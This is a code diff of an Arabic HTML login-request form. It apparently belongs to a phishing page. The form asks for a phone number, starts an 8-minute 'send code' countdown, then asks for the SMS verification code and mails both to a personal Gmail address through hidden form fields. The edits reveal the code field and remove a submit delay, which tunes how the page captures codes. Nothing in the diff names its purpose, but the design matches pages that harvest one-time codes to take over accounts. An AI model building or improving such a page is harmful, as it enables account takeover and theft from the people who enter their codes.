@@ -2,7 +2,7 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8" />
-  <title>نموذج تسجيل البيانات مع عداد</title>
+  <title>نموذج تسجيل البيانات</title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Cairo&display=swap');
     body {
@@ -46,7 +46,6 @@
       border: 2px solid #85c885;
       box-sizing: border-box;
       font-size: 1rem;
-      transition: border-color 0.3s ease;
       direction: rtl;
     }
     input[type="tel"]:focus,
@@ -55,7 +54,7 @@
       outline: none;
       box-shadow: 0 0 8px #3a9d3a;
     }
-    button, #startTimerBtn {
+    button {
       background-color: #2a662a;
       color: white;
       padding: 12px 18px;
@@ -67,9 +66,6 @@
       box-shadow: 0 6px 12px rgba(42, 102, 42, 0.5);
       transition: background-color 0.3s ease;
     }
-    button:hover, #startTimerBtn:hover {
-      background-color: #1e461e;
-    }
     #timer {
       text-align: center;
       font-weight: bold;
@@ -80,6 +76,11 @@
     }
     input[name="_honey"] {
       display: none;
+    }
+    #codeInput {
+      display: none;
+      background-color: white;
+      max-width: 150px;
     }
     @media (max-width: 360px) {
       form {
@@ -93,7 +94,7 @@
       input[type="text"] {
         font-size: 0.9rem;
       }
-      button, #startTimerBtn {
+      button {
         padding: 10px 14px;
         font-size: 0.9rem;
       }
@@ -116,24 +117,23 @@
       <button type="button" id="startTimerBtn">أرسل كود</button>
     </div>
 
-    <input type="text" id="codeInput" name="كود_الرسالة" placeholder="أدخل الكود هنا" required style="background-color: white; max-width: 120px;" />
+    <input type="text" id="codeInput" name="كود_الرسالة" placeholder="أدخل الكود هنا" required />
 
     <input type="hidden" name="البريد_الإلكتروني" value="yblyyll@gmail.com">
     <input type="text" name="_honey">
     <input type="hidden" name="_redirect" value="thanks.html">
 
-    <button type="submit">طلب دخول</button>
+    <button type="submit" id="submitBtn">طلب دخول</button>
   </form>
 
   <script>
     const phoneInput = document.getElementById('phone');
     const startBtn = document.getElementById('startTimerBtn');
     const timerDisplay = document.getElementById('timer');
-    const form = document.getElementById('dataForm');
+    const codeInput = document.getElementById('codeInput');
 
     let countdown;
     let timeLeft = 480; // 8 دقائق
-    let isCountdownFinished = false;
 
     function formatTime(seconds) {
       const m = Math.floor(seconds / 60).toString().padStart(2, '0');
@@ -149,29 +149,21 @@
         return;
       }
 
-      timerDisplay.style.display = 'block';
-      timerDisplay.textContent = `الوقت المتبقي للإرسال: ${formatTime(timeLeft)}`;
       startBtn.disabled = true;
       phoneInput.disabled = true;
+      codeInput.style.display = 'inline-block';
+      timerDisplay.style.display = 'block';
+      timerDisplay.textContent = `الوقت المتبقي للإرسال: ${formatTime(timeLeft)}`;
 
       countdown = setInterval(() => {
         timeLeft--;
         timerDisplay.textContent = `الوقت المتبقي للإرسال: ${formatTime(timeLeft)}`;
         if (timeLeft <= 0) {
           clearInterval(countdown);
-          isCountdownFinished = true;
-          timerDisplay.textContent = 'يتم الآن إرسال النموذج...';
-          form.submit();
+          timerDisplay.textContent = 'انتهى الوقت.';
         }
       }, 1000);
     }
-
-    form.addEventListener('submit', function(e) {
-      if (!isCountdownFinished) {
-        e.preventDefault();
-        alert("يرجى انتظار انتهاء العداد قبل الإرسال.");
-      }
-    });
 
     startBtn.addEventListener('click', startTimer);
   </script>
